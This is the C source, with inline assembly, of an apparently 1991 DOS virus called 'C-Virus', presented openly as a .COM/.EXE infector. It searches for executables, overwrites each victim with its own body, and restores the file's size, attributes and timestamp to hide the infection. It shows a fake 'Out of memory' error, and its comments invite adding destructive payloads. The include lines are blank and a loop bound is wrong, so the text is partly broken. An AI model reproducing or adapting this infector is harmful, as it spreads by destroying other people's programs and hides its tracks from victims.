   /* C-Virus:  A generic .COM and .EXE infector

      Written by Nowhere Man

      Project started and completed on 6-24-91

      Written in Turbo C++ v1.00 (works fine with Turbo C v2.00, too)
   */


   #pragma inline                              // Compile to .ASM

   #include
   #include
   #include
   #include
   #include

   void hostile_activity(void);
   int infected(char *);
   void spread(char *, char *);
   void small_print(char *);
   char *victim(void);

    #define DEBUG
   #define ONE_KAY   1024                      // 1k
   #define TOO_SMALL ((6 * ONE_KAY) + 300)               // 6k+ size minimum
   #define SIGNATURE "NMAN"                    // Sign of infection

   int main(void)
   {
       /* The main program */

       spread(_argv[0], victim());             // Perform infection
       small_print("Out of memory\r\n");       // Print phony error
       return(1);                         // Fake failure...
   }

   void hostile_activity(void)
   {
       /* Put whatever you feel like doing here...I chose to
          make this part harmless, but if you're feeling
          nasty, go ahead and have some fun... */

       small_print("\a\a\aAll files infected.  Mission complete.\r\n");
       exit(2);
   }

   int infected(char *fname)
   {
       /* This function determines if fname is infected */

       FILE *fp;                     // File handle
       char sig[5];                       // Virus signature

       fp = fopen(fname, "rb");
       fseek(fp, 28L, SEEK_SET);
       fread(sig, sizeof(sig) - 1, 1, fp);
   #ifdef DEBUG
       printf("Signature for %s:  %s\n", fname, sig);
   #endif
       fclose(fp);
       return(strncmp(sig, SIGNATURE, sizeof(sig) - 1) == 0);
   }

   void small_print(char *string)
   {
       /* This function is a small, quick print routine */

       asm {
            push si
            mov  si,string
            mov  ah,0xE
       }

   print:   asm {
            lodsb
            or   al,al
            je   finish
            int  0x10
            jmp  short print
       }
   finish: asm   pop  si
   }

   void spread(char *old_name, char *new_name)
   {
       /* This function infects new_name with old_name */


       /* Variable declarations */

       FILE *old, *new;                   // File handles
       struct ftime file_time;                         // Old file date,
   time
       int attrib;                        // Old attributes
       long old_size, virus_size;              // Sizes of files
       char *virus_code = NULL;           // Pointer to virus
       int old_handle, new_handle;             // Handles for files


       /* Perform the infection */

   #ifdef DEBUG
       printf("Infecting %s with %s...\n", new_name, old_name);
   #endif
       old = fopen(old_name, "rb");            // Open virus
       new = fopen(new_name, "rb");            // Open victim
       old_handle = fileno(old);               // Get file handles
       new_handle = fileno(new);
       old_size = filelength(new_handle);      // Get old file size
       virus_size = filelength(old_handle);         // Get virus size
       attrib = _chmod(new_name, 0);           // Get old attributes
       getftime(new_handle, &file_time);       // Get old file time
       fclose(new);                       // Close the virusee
       _chmod(new_name, 1, 0);                 // Clear any read-only
       unlink(new_name);                  // Erase old file
       new = fopen(new_name, "wb");            // Open new virus
       new_handle = fileno(new);
       virus_code = malloc(virus_size);        // Allocate space
       fread(virus_code, virus_size, 1, old);       // Read virus from old
       fwrite(virus_code, virus_size, 1, new);         // Copy virus to new
       _chmod(new_name, 1, attrib);            // Replace attributes
       chsize(new_handle, old_size);           // Replace old size
       setftime(new_handle, &file_time);       // Replace old time


       /* Clean up */

       fcloseall();                       // Close files
       free(virus_code);                  // Free memory
   }

   char *victim(void)
   {
       /* This function returns the virus's next victim */


       /* Variable declarations */

       char *types[] = {"*.EXE", "*.COM"};          // Potential victims
       static struct ffblk ffblk;              // DOS file block
       int done;                     // Indicates finish
       int index;                         // Used for loop


       /* Find our victim */

       if ((_argc > 1) && (fopen(_argv[1], "rb") != NULL))
            return(_argv[1]);

       for (index = 0; index < sizeof(types); index++) {
            done = findfirst(types[index], &ffblk, FA_RDONLY | FA_HIDDEN |
   FA_SYSTEM | FA_ARCH);
            while (!done) {
   #ifdef DEBUG
                 printf("Scanning %s...\n", ffblk.ff_name);
   #endif
                 /* If you want to check for specific days of the week,
                    months, etc., here is the place to insert the
                    code (don't forget to "#include "!) */

                 if ((!infected(ffblk.ff_name)) && (ffblk.ff_fsize >
   TOO_SMALL))
                      return(ffblk.ff_name);
                 done = findnext(&ffblk);
            }
       }


       /* If there are no files left to infect, have a little fun... */

       hostile_activity();
       return(0);                         // Prevents warning
   }
